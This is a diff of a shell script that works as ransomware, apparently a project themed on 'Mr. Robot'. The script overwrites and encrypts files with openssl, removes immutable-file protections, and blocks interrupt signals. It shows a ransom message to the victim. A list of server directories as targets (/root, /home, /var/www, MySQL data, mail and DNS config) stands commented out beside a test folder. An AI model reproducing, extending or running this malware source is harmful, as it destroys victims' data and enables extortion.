@@ -41,11 +41,11 @@ check_req() {
 }
 ################ FUNCTIONS ##########################
 openfile() {
-	if [ "$OS" == "linux" ]; then
+	if [ "$OS" = "linux" ]; then
 		chmod +rw $1
 		chattr -i $1
 	fi
-	if [ "$OS" == "bsd" ]; then
+	if [ "$OS" = "bsd" ]; then
 		chmod +rw $1
 		chflags schg $1
 	fi
@@ -107,7 +107,7 @@ pck() {
 	openfile $1
 	stuff=$(cat $1)
 	echo "RAN" > $1
-	echo -e "$stuff" | openssl aes-256-cbc -k $KEY -out $1 &>/dev/null
+	echo "$stuff" | openssl aes-256-cbc -k $KEY -out $1 &>/dev/null
 	if [ ! -f "$1" ]; then
 		adderr "[!] FILE NOT ENCRYPTED"
 		EXIT
@@ -131,8 +131,11 @@ dec() {
 }
 upk() {
 	if [ "$SOFT" = "" ]; then
-	openssl aes-256-cbc -d -kfile $PRIVATEKEY -in $1 -out $1.dec &>/dev/null
-	mv $1.dec $1
+	openfile $1
+	openfile $1.dec
+	mv $1 $1.enc
+	openssl aes-256-cbc -d -kfile $PRIVATEKEY -in $1.enc -out $1
+	rm $1.enc
 	fi
 }
 dec_loop() {
@@ -149,9 +152,10 @@ dec_loop() {
 main() {
 	trap '' INT
 	trap '' TERM
-	SOFT="YES"
+	#SOFT="YES"
 	init
-	targets="/var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
+	targets="/root/Desktop/testing"
+	#targets="/var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
 	enc_loop "$targets"
 	message="Congratulations Elliot,\n\nYou have been infected with a RANSOMWARE!!!!!\nI know. Scary stuff.\nAnyways, Im giving you a choice. You can either encrypt some important files, or lose access to your box and keep the files. Your choice kid.\n\nLove, Mr. Robot\n\n\nKeep the files?"
 	title="Oops.."
